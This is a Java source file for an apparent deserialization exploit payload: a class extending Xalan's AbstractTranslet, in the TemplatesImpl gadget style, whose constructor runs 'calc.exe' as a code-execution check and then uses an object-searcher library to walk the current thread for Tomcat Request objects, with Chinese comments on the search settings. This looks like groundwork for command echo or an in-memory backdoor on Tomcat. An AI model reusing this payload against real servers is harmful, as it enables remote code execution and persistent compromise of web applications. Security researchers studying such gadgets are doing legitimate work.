package ccdr4gon.archive;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import me.gv7.tools.josearcher.entity.Blacklist;
import me.gv7.tools.josearcher.entity.Keyword;
import me.gv7.tools.josearcher.searcher.SearchRequstByBFS;
import org.apache.catalina.core.StandardContext;
import org.apache.commons.collections.map.LazyMap;

import java.util.ArrayList;
import java.util.List;

public class ObjectSearcher extends AbstractTranslet {
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
    }

    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
    }

    public static String cmd;

    public ObjectSearcher() throws Exception {
        super();
        super.namesArray = new String[]{"ccdr4gon"};
        Runtime.getRuntime().exec("calc.exe");
        //设置搜索类型包含Request关键字的对象
        List<Keyword> keys = new ArrayList<>();
        keys.add(new Keyword.Builder().setField_type("Request").build());
//定义黑名单
        List<Blacklist> blacklists = new ArrayList<>();
        blacklists.add(new Blacklist.Builder().setField_type("java.io.File").build());
//新建一个广度优先搜索Thread.currentThread()的搜索器
        SearchRequstByBFS searcher = new SearchRequstByBFS(Thread.currentThread(), keys);
// 设置黑名单
        searcher.setBlacklists(blacklists);
//打开调试模式,会生成log日志
        searcher.setIs_debug(true);
//挖掘深度为20
        searcher.setMax_search_depth(20);
//设置报告保存位置
        searcher.setReport_save_path("C:\\_code\\tomcat_echo_search\\bin");
        searcher.searchObject();
    }

    public ObjectSearcher(LazyMap map) {
    }

}
